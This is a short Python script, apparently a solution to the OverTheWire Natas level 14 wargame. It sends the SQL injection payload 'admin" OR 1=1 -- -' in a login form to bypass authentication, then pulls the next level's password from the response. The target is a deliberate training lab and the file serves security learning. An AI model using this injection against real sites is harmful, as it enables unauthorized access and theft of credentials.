import re
import requests
from halo import Halo


def get_natas15_password(natas14_password):
    URL = "http://natas14.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 15 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas14", natas14_password)
    payload = 'admin" OR 1=1 -- -'
    data = {"username": payload, "password": "123"}
    response = session.post(URL, data=data)
    natas15_password = re.findall(r'([a-zA-Z\d]{32})', response.text)[1]

    spinner.succeed(text="The password for natas 15 is: " + natas15_password)

    return natas15_password


if __name__ == '__main__':
    natas14_password = ""  # Put here the password for natas14 here
    get_natas15_password(natas14_password)
